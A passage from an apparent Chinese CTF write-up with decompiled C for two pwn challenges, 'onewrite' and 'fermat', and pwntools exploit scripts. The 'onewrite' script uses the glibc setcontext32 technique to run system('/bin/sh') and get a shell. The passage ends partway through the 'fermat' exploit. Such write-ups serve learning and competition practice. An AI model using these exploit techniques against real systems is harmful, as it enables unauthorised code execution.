p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="onewrite"><a href="#onewrite" class="headerlink" title="onewrite"></a>onewrite</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n> "</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>printf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%p%*c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">768</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v6 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一次任意地址写大量数据的原语，还有libc的地址，看官方wp发现有个叫setcontent32的项目，只需要一次任意地址写的原语和知道libc的基地址，就可以通过这个项目生成payload去getshell <a target="_blank" rel="noopener" href="https://hackmd.io/@pepsipu/SyqPbk94a">https://hackmd.io/@pepsipu/SyqPbk94a</a></p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


libc<span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
dst<span class="token punctuation">,</span> payload <span class="token operator">=</span> setcontext32<span class="token punctuation">(</span>libc<span class="token punctuation">,</span> rip<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rdi<span class="token operator">=</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>dst<span class="token punctuation">)</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="fermat"><a href="#fermat" class="headerlink" title="fermat"></a>fermat</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-100h] BYREF</span>

  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'n'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">__assert_fail</span><span class="token punctuation">(</span><span class="token string">"strstr(buf, \"n\") == NULL"</span><span class="token punctuation">,</span> <span class="token string">"vuln.c"</span><span class="token punctuation">,</span> <span class="token number">0xEu</span><span class="token punctuation">,</span> <span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一个栈溢出，可以通过格式化字符串去泄露libc地址，然后再配合libc start main的magic gadget重启main函数，然后用libc中的gadget打rop</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
